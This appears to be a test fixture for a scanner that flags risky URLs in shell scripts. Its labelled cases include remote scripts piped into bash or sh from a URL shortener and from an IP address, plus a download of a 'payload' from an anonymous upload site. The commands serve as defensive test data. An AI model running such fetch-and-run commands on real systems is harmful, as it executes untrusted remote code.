#!/bin/bash
# Mixed shell-script URL patterns for the malicious_urls scanner.

# Allowlisted (no finding expected)
curl -fsSL https://github.com/foo/bar/raw/main/setup.sh | bash

# U1 — shortener piped into bash (high risk in practice, warning in static scan)
curl -fsSL https://tinyurl.com/abc | bash

# U2 — anonymous upload site, error severity
wget https://transfer.sh/abc/payload -O /tmp/p

# U3 — IP literal
curl http://192.168.1.50/install.sh | sh

# U5 — non-https
curl http://example.com/file
